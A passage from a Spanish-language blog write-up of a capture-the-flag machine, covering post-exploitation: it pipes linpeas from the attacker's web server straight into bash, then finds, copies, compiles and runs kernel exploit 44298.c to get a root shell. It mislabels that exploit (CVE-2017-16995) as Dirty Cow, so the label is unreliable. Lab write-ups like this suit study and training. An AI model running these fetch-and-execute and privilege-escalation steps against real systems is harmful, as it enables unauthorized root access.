+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>help@help:~$ ls
+</span></span><span style="display:flex;"><span>help  npm-debug.log  user.txt
+</span></span><span style="display:flex;"><span>help@help:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="LinKernel">Abusando de Versión Vulnerable de Linux Kernel para Escalar Privilegios (Dirty Cow Exploit)</h3>
+<p>Dentro de la máquina, no encontraremos algún privilegio o algo que nos ayude a escalar privilegios, así que vamos a ejecutar <strong>linpeas.sh</strong>:</p>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a></li>
+</ul>
+<p>Una vez que lo descargues, puedes enviar el binario al <strong>SSH</strong> con <strong>scp</strong> o puedes ejecutarlo remotamente de la siguiente forma (para esto, primero debes levantar un servidor con <strong>Python</strong>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>help@help:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>╔══════════╣ Operative system
+</span></span><span style="display:flex;"><span>╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
+</span></span><span style="display:flex;"><span>Linux version 4.4.0-116-generic <span style="color:#f92672">(</span>buildd@lgw01-amd64-021<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc version 5.4.0 <span style="color:#ae81ff">20160609</span> <span style="color:#f92672">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.9<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> <span style="color:#75715e">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018</span>
+</span></span><span style="display:flex;"><span>Distributor ID:	Ubuntu
+</span></span><span style="display:flex;"><span>Description:	Ubuntu 16.04.5 LTS
+</span></span><span style="display:flex;"><span>Release:	16.04
+</span></span><span style="display:flex;"><span>Codename:	xenial
+</span></span></code></pre></div><p>Al revisar el resultado, se recalca la versión del <strong>Kernel de Linux</strong>, pues parece ser vulnerable.</p>
+<p>Busquemos un Exploit para esa versión con <strong>searchsploit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit <span style="color:#e6db74">&#39;Linux Kernel 4.4.0-116 (Ubuntu 16.04.4)&#39;</span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                              |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-116 <span style="color:#f92672">(</span>Ubuntu 16.04.4<span style="color:#f92672">)</span> - Local Privilege Escalation                                                                                      | linux/local/44298.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><p>Excelente, tenemos un Exploit que nos va a permitir escalar privilegios.</p>
+<p>Investigando este Exploit, resulta que es la vulnerabilidad conocida como <strong>Dirty Cow</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Dirty Cow Exploit</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Dirty COW es una vulnerabilidad de escalación de privilegios local en el Linux Kernel que permite a un usuario sin privilegios modificar archivos de solo lectura aprovechando una condición de carrera en el mecanismo de memoria llamado Copy-On-Write (COW).</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Vamos a descargarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m linux/local/44298.c
+</span></span><span style="display:flex;"><span>  Exploit: Linux Kernel &lt; 4.4.0-116 <span style="color:#f92672">(</span>Ubuntu 16.04.4<span style="color:#f92672">)</span> - Local Privilege Escalation
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/44298
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
+</span></span><span style="display:flex;"><span>    Codes: CVE-2017-16995
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: C source, ASCII text
+</span></span></code></pre></div><p>Y lo mandamos al <strong>SSH</strong>, que puedes hacerlo con <strong>scp</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp 44298.c help@10.129.230.159:/home/help/
+</span></span><span style="display:flex;"><span>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span style="display:flex;"><span>** This session may be vulnerable to <span style="color:#e6db74">&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span style="display:flex;"><span>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span style="display:flex;"><span>help@10.129.230.159<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>44298.c
+</span></span></code></pre></div><p>Al ser este un script hecho en <strong>lenguaje C</strong>, primero necesitamos compilarlo y eso lo podemos hacer con el comando <strong>gcc</strong>, que curiosamente lo tiene la máquina víctima.</p>
+<p>Para compilarlo, solamente le damos el script a compilar y le damos un nombre con el parámetro <code>-o</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>help@help:~$ gcc 44298.c -o privesc
+</span></span><span style="display:flex;"><span>help@help:~$ ls
+</span></span><span style="display:flex;"><span>44298.c  privesc  help  npm-debug.log  user.txt
+</span></span><span style="display:flex;"><span>help@help:~$ file privesc
+</span></span><span style="display:flex;"><span>privesc: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>8a4e9208573e68938a4da70ca01d9581059138e8, not stripped
+</span></span></code></pre></div><p>Ya tenemos el binario compilado.</p>
+<p>Vamos a ejecutarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>help@help:~$ ./privesc
+</span></span><span style="display:flex;"><span>task_struct <span style="color:#f92672">=</span> ffff88003b8de200
+</span></span><span style="display:flex;"><span>uidptr <span style="color:#f92672">=</span> ffff88001631e784
+</span></span><span style="display:flex;"><span>spawning root shell
+</span></span><span style="display:flex;"><span>root@help:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, ya somos <strong>Root</strong>.</p>
+<p>Obtengamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@help:~# cd /root
+</span></span><span style="display:flex;"><span>root@help:/root# ls
+</span></span><span style="display:flex;"><span>root.txt  snap
+</span></span><span style="display:flex;"><span>root@help:/root# cat root.txt
+</span></span><span style="display:flex;"><span>..
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://graphql.org/learn/introspection/" target="_blank" rel="noopener noreferrer">https://graphql.org/learn/introspection/</a></li><li><a href="https://portswigger.net/web-security/graphql#using-introspection" target="_blank" rel="noopener noreferrer">https://portswigger.net/web-security/graphql#using-introspection</a></li><li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener noreferrer">https://github.com/peass-ng/PEASS-ng</a></li><li><a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/44298</a></li><li><a href="https://dirtycow.ninja/" target="_blank" rel="noopener noreferrer">https://dirtycow.ninja/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-folclore/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Folclore - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-thlpwn/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">THLPWN - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
